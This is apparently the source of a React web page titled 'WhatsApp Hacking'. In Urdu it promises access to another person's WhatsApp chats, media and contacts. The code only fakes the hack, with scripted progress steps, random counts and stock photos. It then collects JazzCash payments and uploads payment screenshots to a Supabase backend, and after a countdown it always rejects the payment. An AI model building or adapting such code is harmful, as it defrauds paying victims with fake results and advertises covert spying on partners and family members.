import { createFileRoute } from "@tanstack/react-router";
import { useState, useRef, useEffect } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Lock, Video, Mic, Image, Phone, Copy, Upload, Check, X } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import jazzcashLogo from "@/assets/jazzcash-logo.png";
import { fetchPaymentSettings } from "@/lib/payment-settings";
import { supabase } from "@/integrations/supabase/client";
const steps = [
  "Connecting...",
  "Device access...",
  "Server access...",
  "Finding data...",
  "Getting data...",
  "Processing...",
  "Almost done..."
];

// Image pools for random selection - Videos with human figures
const videoImages = [
  "photo-1516321497487-e288fb19713f", // person using phone
  "photo-1573496359142-b8d87734a5a2", // woman at laptop
  "photo-1522202176988-66273c2fd55f", // people in meeting
  "photo-1507003211169-0a1dd7228f2d", // person portrait
  "photo-1517841905240-472988babdf9", // woman portrait
  "photo-1539571696357-5a69c17a67c6", // man portrait
  "photo-1524504388940-b1c1722653e1", // person with camera
  "photo-1506794778202-cad84cf45f1d"  // man portrait
];

// Audio waveforms and sound related images
const voiceImages = [
  "photo-1598653222000-6b7b7a552625", // audio waveform
  "photo-1558021212-51b6ecfa0db9", // sound waves
  "photo-1571330735066-03aaa9429d89", // audio equipment
  "photo-1590602847861-f357a9332bbc", // microphone
  "photo-1478737270239-2f02b77fc618", // podcast mic
  "photo-1598488035139-bdbb2231ce04", // audio mixing
  "photo-1511671782779-c97d3d27a1d4", // sound board
  "photo-1493225457124-a3eb161ffa5f"  // audio wave
];

// Human portraits and faces
const galleryImages = [
  "photo-1494790108377-be9c29b29330", // woman smiling
  "photo-1507003211169-0a1dd7228f2d", // man portrait
  "photo-1517841905240-472988babdf9", // woman portrait
  "photo-1539571696357-5a69c17a67c6", // man casual
  "photo-1524504388940-b1c1722653e1", // woman outdoor
  "photo-1506794778202-cad84cf45f1d", // man professional
  "photo-1488426862026-3ee34a7d66df", // woman happy
  "photo-1500648767791-00dcc994a43e"  // man smiling
];

// Pakistani phone numbers (we'll generate text-based numbers instead of images)
const pakistaniNumbers = [
  "+92 300 1234567",
  "+92 321 9876543",
  "+92 333 4567890",
  "+92 345 6543210",
  "+92 311 2223334",
  "+92 303 5556667",
  "+92 322 8889990",
  "+92 312 1112223"
];

const getRandomImages = (pool: string[], count: number) => {
  const shuffled = [...pool].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, count);
};

const getRandomNumbers = (pool: string[], count: number) => {
  const shuffled = [...pool].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, count);
};

const Index = () => {
  const [number, setNumber] = useState("");
  const [showError, setShowError] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [isComplete, setIsComplete] = useState(false);
  const [showPayment, setShowPayment] = useState(false);
  const [results, setResults] = useState({
    videos: 0,
    voices: 0,
    images: 0,
    numbers: 0
  });
  const [randomImages, setRandomImages] = useState({
    videos: getRandomImages(videoImages, 4),
    voices: getRandomImages(voiceImages, 4),
    gallery: getRandomImages(galleryImages, 4),
    numbers: getRandomNumbers(pakistaniNumbers, 4)
  });
  const [copied, setCopied] = useState(false);
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [countdown, setCountdown] = useState(20);
  const [verifyComplete, setVerifyComplete] = useState(false);
  const [paymentSettings, setPaymentSettings] = useState<{
    phone_number: string;
    account_name: string;
    amount: number;
    logo_url: string | null;
    account_label: string;
    whatsapp_link: string;
  } | null>(null);

  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    let isMounted = true;

    const loadPaymentSettings = async () => {
      const data = await fetchPaymentSettings();

      if (data && isMounted) {
        setPaymentSettings(data);
      }
    };

    loadPaymentSettings();
    const interval = window.setInterval(loadPaymentSettings, 10000);
    const channel = supabase
      .channel("payment-settings-live-updates")
      .on(
        "postgres_changes",
        {
          event: "*",
          schema: "public",
          table: "payment_settings",
        },
        () => {
          loadPaymentSettings();
        },
      )
      .subscribe();

    return () => {
      isMounted = false;
      window.clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, []);

  const formattedAmount = paymentSettings
    ? paymentSettings.amount.toLocaleString("en-US")
    : "...";

  const handleCopyNumber = () => {
    if (!paymentSettings) return;
    navigator.clipboard.writeText(paymentSettings.phone_number);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setScreenshot(e.target.files[0]);
    }
  };

  const handleConfirmPayment = async () => {
    if (!screenshot) return;
    setIsVerifying(true);
    setCountdown(20);
    setVerifyComplete(false);

    // Upload screenshot to storage + record in DB (fire and forget)
    try {
      const ext = screenshot.name.split(".").pop()?.toLowerCase() || "jpg";
      const path = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}.${ext}`;
      const { error: upErr } = await supabase.storage
        .from("payment-screenshots")
        .upload(path, screenshot, {
          contentType: screenshot.type || "image/jpeg",
          upsert: false,
        });
      if (upErr) throw upErr;
      await supabase.from("payment_screenshots").insert({
        storage_path: path,
        public_url: "",
        user_phone: number || null,
        amount: paymentSettings?.amount ?? null,
      });
    } catch (err) {
      console.error("Screenshot upload failed", err);
    }
  };

  useEffect(() => {
    if (isVerifying && countdown > 0 && !verifyComplete) {
      const timer = setTimeout(() => {
        setCountdown(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (isVerifying && countdown === 0 && !verifyComplete) {
      setVerifyComplete(true);
    }
  }, [isVerifying, countdown, verifyComplete]);

  const generateRandomResults = () => {
    return {
      videos: Math.floor(Math.random() * 900) + 100,
      voices: Math.floor(Math.random() * 900) + 100,
      images: Math.floor(Math.random() * 900) + 100,
      numbers: Math.floor(Math.random() * 900) + 100
    };
  };

  const handleStart = () => {
    if (!number) return;
    
    // Get only digits for counting
    const digitsOnly = number.replace(/[^0-9]/g, '');
    
    // Check if digits are between 9 and 17
    if (digitsOnly.length < 9 || digitsOnly.length > 17) {
      setShowError(true);
      return;
    }
    
    setShowError(false);
    setIsProcessing(true);
    setIsComplete(false);
    setCurrentStep(0);
    
    // Generate new random images for each search
    setRandomImages({
      videos: getRandomImages(videoImages, 4),
      voices: getRandomImages(voiceImages, 4),
      gallery: getRandomImages(galleryImages, 4),
      numbers: getRandomNumbers(pakistaniNumbers, 4)
    });

    let step = 0;
    const interval = setInterval(() => {
      step++;
      if (step < steps.length) {
        setCurrentStep(step);
      } else {
        clearInterval(interval);
        setResults(generateRandomResults());
        setIsComplete(true);
      }
    }, 714); // 5 seconds total / 7 steps
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Professional gradient background */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#0a0a0a] via-[#1a1a2e] to-[#16213e]"></div>
      
      {/* Animated gradient orbs */}
      <div className="absolute top-1/4 -left-20 w-72 h-72 bg-[#25D366]/20 rounded-full blur-3xl animate-pulse"></div>
      <div className="absolute bottom-1/4 -right-20 w-96 h-96 bg-[#128C7E]/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-[#075E54]/10 rounded-full blur-3xl"></div>
      
      {/* Grid pattern overlay */}
      <div 
        className="absolute inset-0 opacity-[0.03]"
        style={{
          backgroundImage: `linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px),
                           linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px)`,
          backgroundSize: '50px 50px'
        }}
      ></div>
      
      <div className="relative z-10 flex flex-col items-center w-full">
        {/* Close Button - Only show when complete */}
        {isComplete && (
          <button 
            onClick={() => {
              setIsComplete(false);
              setIsProcessing(false);
              setNumber('');
            }}
            className="absolute top-20 right-2 w-8 h-8 flex items-center justify-center bg-white/10 hover:bg-white/20 backdrop-blur-md rounded-full border border-white/20 text-white transition-all duration-200"
          >
            <X className="w-5 h-5" />
          </button>
        )}
        
        {/* WhatsApp Hacking Title - At Top - Only show on first page */}
        {!isComplete && (
          <div className="flex flex-col items-center gap-2 mb-6">
            <div className="flex items-center gap-3">
              <svg viewBox="0 0 24 24" className="w-12 h-12 fill-[#25D366]">
                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
              </svg>
              <h1 className="text-3xl md:text-5xl font-bold text-white">WhatsApp Hacking</h1>
            </div>
          </div>
        )}

        {!isProcessing && (
          <div className="bg-white/10 backdrop-blur-md rounded-xl p-4 border border-white/20 mb-6 max-w-md w-full">
            <p className="text-center text-[#ffffff] font-urdu leading-relaxed text-sm md:text-base" dir="rtl">
              اپنے پیاروں کے واٹس ایپ دیکھیں وہ کس سے باتیں کرتے ہیں اور آپ ان کے واٹس ایپ میں آنے والی ویڈیو آڈیو اور تصویریں بھی دیکھ سکتے ہیں اور آپ ہر وقت ان کے واٹس ایپ پر نظر رکھ سکتے ہیں
            </p>
          </div>
        )}

        {!isProcessing ? (
          <div className="flex flex-col gap-6 w-full max-w-md items-center">
            
            <div className="flex flex-col sm:flex-row gap-3 w-full">
              <div className="relative flex-1">
                <Input
                  type="tel"
                  placeholder="Enter number..."
                  value={number}
                  onChange={(e) => {
                    setNumber(e.target.value);
                    setShowError(false);
                  }}
                  className={`w-full text-lg h-12 bg-white/10 border-white/20 text-white placeholder:text-white/50 ${showError ? 'border-red-500 border-2' : ''}`}
                />
                {showError && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-red-500 flex items-center justify-center">
                    <span className="text-white text-xs font-bold">!</span>
                  </div>
                )}
              </div>
              <Button onClick={handleStart} className="h-12 px-8 text-lg bg-[#00a884] hover:bg-[#008f72]">
                Hack
              </Button>
            </div>
          </div>
        ) : !isComplete ? (
          <div className="flex flex-col items-center gap-6">
            {/* Spinning Circle with text inside */}
            <div className="relative w-40 h-40 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border-[6px] border-white/20"></div>
              <div className="absolute inset-0 rounded-full border-[6px] border-[#25D366] border-t-transparent animate-spin"></div>
              
              {/* Text inside circle */}
              <p className="text-sm font-medium text-white text-center animate-pulse z-10 px-4">
                {steps[currentStep]}
              </p>
            </div>
          </div>
        ) : (
          <div className="flex flex-col items-center gap-6 w-full max-w-lg">
            {/* WhatsApp Hacked Title */}
            <div className="flex items-center gap-3 mb-2">
              <svg viewBox="0 0 24 24" className="w-10 h-10 fill-[#25D366]">
                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
              </svg>
              <h1 className="text-2xl md:text-4xl font-bold text-white">WhatsApp Hacked</h1>
            </div>
            <h2 className="text-xl font-bold text-[#25D366] mb-2">Data Found!</h2>
            
            {/* Result Cards */}
            <div className="grid grid-cols-2 gap-4 w-full">
              {/* Videos Card */}
              <div onClick={() => setShowPayment(true)} className="relative bg-white/5 backdrop-blur-md rounded-xl p-4 border border-white/10 overflow-hidden group h-44 cursor-pointer hover:border-[#25D366]/50 transition-all">
                {/* Blurred video thumbnails preview */}
                <div className="absolute inset-0 overflow-hidden">
                  <div className="grid grid-cols-2 gap-1 w-full h-full">
                    {randomImages.videos.map((img, i) => (
                      <img key={i} src={`https://images.unsplash.com/${img}?w=100&h=80&fit=crop`} alt="" className="w-full h-full object-cover" />
                    ))}
                  </div>
                  <div className="absolute inset-0 backdrop-blur-sm bg-black/30"></div>
                </div>
                <div className="relative z-30 h-full flex flex-col">
                  <div className="absolute top-0 right-0">
                    <Lock className="w-5 h-5 text-yellow-500" />
                  </div>
                  <Video className="w-8 h-8 text-white mb-auto" />
                  <div className="mt-auto">
                    <p className="text-base font-bold text-[#ffffff] tracking-wide drop-shadow-lg">Videos</p>
                    <p className="text-2xl font-bold text-[#ffffff] drop-shadow-lg">{results.videos}</p>
                  </div>
                </div>
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end justify-center pb-3 z-20">
                  <span className="text-sm text-yellow-500 font-semibold flex items-center gap-1">
                    <Lock className="w-4 h-4" /> Premium
                  </span>
                </div>
              </div>

              {/* Voices Card - WhatsApp Style */}
              <div onClick={() => setShowPayment(true)} className="relative bg-white/5 backdrop-blur-md rounded-xl p-4 border border-white/10 overflow-hidden group h-44 cursor-pointer hover:border-[#25D366]/50 transition-all">
                {/* WhatsApp voice messages preview */}
                <div className="absolute inset-0 overflow-hidden bg-[#0b141a]">
                  <div className="flex flex-col gap-2 p-2.5 w-full h-full justify-center">
                    {[0, 1, 2].map((i) => (
                      <div 
                        key={i} 
                        className={`flex items-center gap-3 px-3 py-2.5 rounded-2xl shadow-lg ${i % 2 === 0 ? 'bg-[#005c4b]' : 'bg-[#1f2c34]'}`}
                      >
                        {/* Play button */}
                        <div className="w-8 h-8 rounded-full bg-[#25D366] flex items-center justify-center flex-shrink-0 shadow-md">
                          <div className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-white border-b-[5px] border-b-transparent ml-1"></div>
                        </div>
                        {/* Waveform */}
                        <div className="flex items-center gap-[2px] flex-1 h-6">
                          {Array.from({ length: 20 }).map((_, j) => (
                            <div
                              key={j}
                              className="w-[3px] bg-[#8696a0] rounded-full"
                              style={{
                                height: `${Math.random() * 70 + 30}%`,
                              }}
                            />
                          ))}
                        </div>
                        {/* Duration */}
                        <span className="text-[10px] text-[#8696a0] flex-shrink-0 font-medium">0:{String(Math.floor(Math.random() * 50) + 10).padStart(2, '0')}</span>
                      </div>
                    ))}
                  </div>
                <div className="absolute inset-0 backdrop-blur-[0.5px] bg-black/5"></div>
                </div>
                <div className="relative z-30 h-full flex flex-col">
                  <div className="absolute top-0 right-0">
                    <Lock className="w-5 h-5 text-yellow-500" />
                  </div>
                  <Mic className="w-8 h-8 text-white mb-auto" />
                  <div className="mt-auto">
                    <p className="text-base font-bold text-[#ffffff] tracking-wide drop-shadow-lg">Voices</p>
                    <p className="text-2xl font-bold text-[#ffffff] drop-shadow-lg">{results.voices}</p>
                  </div>
                </div>
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end justify-center pb-3 z-20">
                  <span className="text-sm text-yellow-500 font-semibold flex items-center gap-1">
                    <Lock className="w-4 h-4" /> Premium
                  </span>
                </div>
              </div>

              {/* Images Card */}
              <div onClick={() => setShowPayment(true)} className="relative bg-white/5 backdrop-blur-md rounded-xl p-4 border border-white/10 overflow-hidden group h-44 cursor-pointer hover:border-[#25D366]/50 transition-all">
                {/* Blurred images gallery preview */}
                <div className="absolute inset-0 overflow-hidden">
                  <div className="grid grid-cols-2 gap-1 w-full h-full">
                    {randomImages.gallery.map((img, i) => (
                      <img key={i} src={`https://images.unsplash.com/${img}?w=100&h=80&fit=crop`} alt="" className="w-full h-full object-cover" />
                    ))}
                  </div>
                  <div className="absolute inset-0 backdrop-blur-sm bg-black/30"></div>
                </div>
                <div className="relative z-30 h-full flex flex-col">
                  <div className="absolute top-0 right-0">
                    <Lock className="w-5 h-5 text-yellow-500" />
                  </div>
                  <Image className="w-8 h-8 text-white mb-auto" />
                  <div className="mt-auto">
                    <p className="text-base font-bold text-[#ffffff] tracking-wide drop-shadow-lg">Images</p>
                    <p className="text-2xl font-bold text-[#ffffff] drop-shadow-lg">{results.images}</p>
                  </div>
                </div>
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end justify-center pb-3 z-20">
                  <span className="text-sm text-yellow-500 font-semibold flex items-center gap-1">
                    <Lock className="w-4 h-4" /> Premium
                  </span>
                </div>
              </div>

              {/* Numbers Card */}
              <div onClick={() => setShowPayment(true)} className="relative bg-white/5 backdrop-blur-md rounded-xl p-4 border border-white/10 overflow-hidden group h-44 cursor-pointer hover:border-[#25D366]/50 transition-all">
                {/* WhatsApp style contact list */}
                <div className="absolute inset-0 overflow-hidden bg-[#111b21]">
                  <div className="flex flex-col w-full h-full">
                    {randomImages.numbers.map((num, i) => (
                      <div key={i} className="flex items-center gap-2 px-2 py-1.5 border-b border-white/10">
                        <div className="w-6 h-6 rounded-full bg-[#25D366]/30 flex items-center justify-center">
                          <Phone className="w-3 h-3 text-[#25D366]" />
                        </div>
                        <span className="text-white text-xs font-medium">
                          +92 <span className="blur-[4px]">{num.slice(4)}</span>
                        </span>
                      </div>
                    ))}
                  </div>
                  <div className="absolute inset-0 backdrop-blur-[1px] bg-black/10"></div>
                </div>
                <div className="relative z-30 h-full flex flex-col">
                  <div className="absolute top-0 right-0">
                    <Lock className="w-5 h-5 text-yellow-500" />
                  </div>
                  <Phone className="w-8 h-8 text-white mb-auto" />
                  <div className="mt-auto">
                    <p className="text-base font-bold text-[#ffffff] tracking-wide drop-shadow-lg">Numbers</p>
                    <p className="text-2xl font-bold text-[#ffffff] drop-shadow-lg">{results.numbers}</p>
                  </div>
                </div>
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end justify-center pb-3 z-20">
                  <span className="text-sm text-yellow-500 font-semibold flex items-center gap-1">
                    <Lock className="w-4 h-4" /> Premium
                  </span>
                </div>
              </div>
            </div>

            {/* Urdu Description */}
            <div className="w-full max-w-lg bg-white/10 backdrop-blur-md rounded-xl p-4 border border-white/20 mt-2">
              <p className="text-center text-sm text-white/90 leading-loose font-urdu" dir="rtl">
                برائے مہربانی پیمنٹ کریں، ایک بار پیمنٹ کرنے سے 90 دن تک آپ اس نمبر <span className="font-bold text-red-500" dir="ltr">{number}</span> کا ڈیٹا مفت دیکھ سکتے ہیں اور روزانہ ان کی بات چیت کو لائیو دیکھ سکتے ہیں، اور یہ ڈیٹا آپ ڈاؤن لوڈ بھی کر سکتے ہیں
              </p>
            </div>

            {/* Pay Now Button */}
            <Button 
              onClick={() => setShowPayment(true)}
              className="w-full max-w-sm h-14 text-xl font-bold bg-gradient-to-r from-[#25D366] to-[#128C7E] hover:from-[#20bd5a] hover:to-[#0f7a6d] mt-4 shadow-lg shadow-[#25D366]/30"
            >
              Pay Now
            </Button>
          </div>
        )}
      </div>

      {/* Payment Dialog */}
      <Dialog open={showPayment} onOpenChange={(open) => {
        setShowPayment(open);
        if (!open) {
          setScreenshot(null);
          setIsVerifying(false);
          setCountdown(20);
          setVerifyComplete(false);
        }
      }}>
        <DialogContent className="bg-gray-100 border-0 text-gray-800 max-w-sm max-h-[90vh] overflow-y-auto p-0 rounded-2xl shadow-2xl">
          {/* Header Banner */}
          <div className="bg-[#1a5c38] text-white py-4 px-6 rounded-t-2xl">
            <DialogHeader>
              <DialogTitle className="text-xl font-bold text-center text-white">
                {isVerifying ? "Please Wait..." : "پیمنٹ کریں"}
              </DialogTitle>
            </DialogHeader>
          </div>
          
          {!isVerifying ? (
            <div className="flex flex-col items-center gap-5 p-6">
              {/* Custom / JazzCash Logo */}
              <div className="bg-white rounded-xl p-4 shadow-md w-full flex justify-center">
                <img
                  src={paymentSettings?.logo_url || jazzcashLogo}
                  alt={paymentSettings?.account_label || "JazzCash"}
                  className="h-14 object-contain"
                />
              </div>
              
              {/* Account Details Card */}
              <div className="bg-white rounded-xl p-5 shadow-md w-full">
                {/* Account Label */}
                <p className="text-center text-gray-600 font-medium mb-2">{paymentSettings?.account_label || "JazzCash"} Account</p>

                
                {/* Account Number with Copy Button */}
                <div className="relative flex items-center justify-center gap-3 bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 mb-3">
                  <span className="text-xl font-bold text-[#1a5c38] tracking-wider">{paymentSettings?.phone_number ?? "..."}</span>
                  <Button
                    variant="ghost"
                    size="icon"
                    onClick={handleCopyNumber}
                    className="h-10 w-10 text-[#1a5c38] hover:bg-gray-100"
                  >
                    {copied ? <Check className="w-6 h-6 text-green-500" /> : <Copy className="w-6 h-6" />}
                  </Button>
                  
                  {/* Copy Notification */}
                  {copied && (
                    <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-[#1a5c38] text-white text-xs px-3 py-1 rounded-full shadow-lg animate-fade-in">
                      نمبر کاپی ہو گیا!
                    </div>
                  )}
                </div>
                
                {/* Account Name */}
                <p className="text-center text-lg font-semibold text-gray-800">{paymentSettings?.account_name ?? "..."}</p>
                
                {/* Price */}
                <p className="text-center text-lg font-semibold text-gray-800 mt-3">PKR {formattedAmount}</p>
              </div>
              
              {/* Important Instructions */}
              <div className="w-full bg-amber-50 border border-amber-200 rounded-xl p-4">
                <h4 className="text-center font-bold text-[#1a5c38] mb-3 font-urdu text-base" dir="rtl">
                  اہم ہدایات:
                </h4>
                <ul className="space-y-2 text-sm text-gray-700 font-urdu leading-loose" dir="rtl">
                  <li className="flex items-start gap-2">
                    <span className="text-[#1a5c38] font-bold">•</span>
                    <span>براہِ کرم صرف <strong className="text-[#1a5c38]">{formattedAmount} روپے</strong> کی ادائیگی کریں۔</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-[#1a5c38] font-bold">•</span>
                    <span>آپ کسی بھی بینک اکاؤنٹ یا والٹ اکاؤنٹ سے اوپر دیے گئے اکاؤنٹ میں پیمنٹ کر سکتے ہیں۔</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-[#1a5c38] font-bold">•</span>
                    <span>ادائیگی کے بعد نئی اسکرین شاٹ اپلوڈ کریں (پرانا / ایڈیٹڈ اسکرین شاٹ قبول نہیں ہوگا)۔</span>
                  </li>
                </ul>
              </div>

              {/* Upload Screenshot Section */}
              <div className="w-full">
                <p className="text-center text-sm text-gray-600 font-urdu mb-2" dir="rtl">
                  پیمٹ اسکرین شاٹ اپلوڈ کریں
                </p>
                <input
                  type="file"
                  accept="image/*"
                  onChange={handleFileChange}
                  ref={fileInputRef}
                  className="hidden"
                />
                <Button
                  variant="outline"
                  onClick={() => fileInputRef.current?.click()}
                  className="w-full h-14 border-dashed border-2 border-[#1a5c38] bg-white hover:bg-gray-50 text-[#1a5c38] rounded-xl font-medium"
                >
                  <Upload className="w-5 h-5 mr-2" />
                  {screenshot ? screenshot.name : "Upload Payment Screenshot"}
                </Button>
              </div>


              {/* Confirm Payment Button */}

              <Button 
                onClick={handleConfirmPayment}
                disabled={!screenshot}
                className="w-full h-14 text-lg font-bold bg-[#1a5c38] hover:bg-[#154a2d] text-white disabled:opacity-50 disabled:cursor-not-allowed rounded-xl shadow-lg"
              >
                Payment Confirm
              </Button>
            </div>
          ) : (
            <div className="flex flex-col items-center gap-6 p-8">
              <div className="w-full bg-white rounded-xl p-6 shadow-md">
                {!verifyComplete ? (
                  <>
                    {/* Countdown Timer */}
                    <div className="flex flex-col items-center mb-4">
                      <div className="w-20 h-20 rounded-full border-4 border-[#1a5c38] flex items-center justify-center mb-3">
                        <span className="text-3xl font-bold text-[#1a5c38]">{countdown}</span>
                      </div>
                      <p className="text-gray-500 text-sm">سیکنڈ باقی</p>
                    </div>
                    <p className="text-gray-700 text-center text-base font-medium">
                      Payment verification in progress.
                    </p>
                  </>
                ) : (
                  <div className="flex flex-col items-center gap-4">
                    <div className="bg-red-50 border border-red-200 rounded-lg px-4 py-4 animate-fade-in w-full">
                      <p className="text-center text-base text-red-600 font-urdu font-semibold" dir="rtl">
                        برائے مہربانی پیمنٹ کریں اور درست اسکرین شاٹ اپلوڈ کریں!
                      </p>
                    </div>
                    {/* WhatsApp Support Button (dynamic link from admin panel) */}
                    {paymentSettings?.whatsapp_link && paymentSettings.whatsapp_link.trim().length > 0 && (
                      <a
                        href={paymentSettings.whatsapp_link}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="w-full flex items-center justify-center gap-2 h-12 rounded-xl bg-[#25D366] hover:bg-[#1ebe5b] text-white font-semibold shadow-md transition-colors"
                      >
                        <svg viewBox="0 0 24 24" className="w-5 h-5 fill-white" aria-hidden="true">
                          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
                        </svg>
                        Get Support
                      </a>
                    )}
                    <Button
                      onClick={() => {
                        setIsVerifying(false);
                        setVerifyComplete(false);
                        setCountdown(20);
                        setScreenshot(null);
                      }}
                      className="w-full h-12 bg-[#1a5c38] hover:bg-[#154a2d] text-white font-medium rounded-xl"
                    >
                      واپس جائیں
                    </Button>
                  </div>
                )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export const Route = createFileRoute("/")({ component: Index });
